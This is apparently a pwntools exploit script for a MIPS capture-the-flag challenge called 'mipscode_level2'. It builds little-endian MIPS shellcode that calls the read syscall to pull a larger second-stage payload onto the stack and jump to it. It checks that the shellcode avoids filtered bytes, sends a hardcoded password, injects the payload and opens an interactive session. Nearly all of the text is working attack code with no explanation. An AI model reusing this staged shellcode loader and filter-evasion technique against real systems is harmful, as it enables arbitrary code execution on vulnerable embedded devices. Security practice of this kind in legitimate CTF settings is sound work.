from pwn import *
context.update(arch='mips', os='linux', bits=32, endian='little')
context.log_level = 'debug'
#r = remote('mipscode-level1.chal.cyberjousting.com', 1356)
#r = gdb.debug('./mipscode_level2', 'b main\nc')
r = process('./mipscode_level2')
shellcode = '''
li $v0, 4003
slti $a0, $a2, -300
move $a1, $sp
li $a2, 500 
syscall 0x040405
jalr $17, $ra
/* filler instruction for branch delay slot */
lui $a3, 0xffff   
'''
payload = asm(shellcode)
print(len(payload), payload)
assert b'\x00' not in payload 
assert b'\x20' not in payload 
assert b'\x09' not in payload  
assert b'\x0a' not in payload 
assert b'\x0b' not in payload 
assert b'\x0c' not in payload 
assert b'\x0d' not in payload
#process(make_elf(payload, extract=False)).interactive()
r.recvuntil(b'password: ')
r.sendline(b'8ff28f88f91b8f93006ed39cba6217e2860cb2c004eb490a1b16aeb2948164d6')
r.recvuntil(b'Shellcode> ')
r.send(payload)
r.interactive()

